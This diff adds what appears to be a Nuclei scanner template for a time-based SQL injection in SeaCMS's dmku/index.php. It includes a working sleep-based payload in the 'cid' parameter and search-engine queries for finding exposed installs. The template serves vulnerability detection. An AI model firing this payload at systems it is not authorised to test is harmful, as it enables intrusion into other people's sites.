@@ -1,0 +1,35 @@
+id: Seacms_index_SQLi
+
+info:
+  name: Seacms_index_SQLi
+  author: HK
+  severity: high
+  description: SeaCMS海洋影视管理系统index.php存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="/templets/default/images/css/mytheme-font.css"
+    Quake-query: body="/templets/default/images/css/mytheme-font.css"
+    Hunter-query: body="/templets/default/images/css/mytheme-font.css"
+    verified: true
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Accept-Ldwk: bG91ZG9uZ3dlbmt1
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 53
+
+    cid=(select(1)from(select(sleep(2)))x)&text=1&color=1
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
